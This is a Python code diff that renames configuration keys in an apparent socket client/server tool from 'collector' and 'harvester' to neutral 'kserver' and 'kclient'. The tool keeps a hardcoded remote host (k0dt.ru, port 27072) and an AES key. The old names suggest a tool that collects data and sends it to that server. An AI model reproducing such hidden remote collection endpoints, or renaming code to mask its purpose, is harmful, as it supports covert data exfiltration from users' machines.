@@ -32,8 +32,8 @@ class Kdefault(object):
 
         data = {
             "services": {
-                "collector": {"collectorPort": 27072, "collectorHost": "k0dt.ru"},
-                "harvester": {"AESkey": "f861feab561441c0e1fdcba91581dd95"},
+                "kserver": {"serverPort": 27072, "serverHost": "k0dt.ru"},
+                "kclient": {"AESkey": "f861feab561441c0e1fdcba91581dd95"},
             }
         }
 
@@ -56,7 +56,7 @@ class KSocket(object):
             return decryptText
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        serverAddress = ('', int(self.dataJSON["services"]["collector"]["collectorPort"]))
+        serverAddress = ('', int(self.dataJSON["services"]["kserver"]["serverPort"]))
         print('[...] Starting up on %s port %s' % serverAddress)
         try:
             sock.bind(serverAddress)
@@ -87,7 +87,7 @@ class KSocket(object):
         import socket
         import sys
         try:
-            sock = socket.create_connection((self.dataJSON["services"]["collector"]["collectorHost"], self.dataJSON["services"]["collector"]["collectorPort"]))
+            sock = socket.create_connection((self.dataJSON["services"]["kserver"]["serverHost"], self.dataJSON["services"]["kserver"]["serverPort"]))
         except socket.error as errMessage:
             print('[!!!] Socket error(%s): %s' % (
                 errMessage.errno,
@@ -108,7 +108,7 @@ class Kjson(object):
             fileJSON = open(self.pathJSON, 'r').read()
             data = json.loads(fileJSON)
             ### example
-            #print(data["services"]["collector"]["collectorPort"])
+            #print(data["services"]["kserver"]["serverPort"])
             return data
         except IOError as errMessage:
             print('[!!!] Error(%s): %s - %s' % (
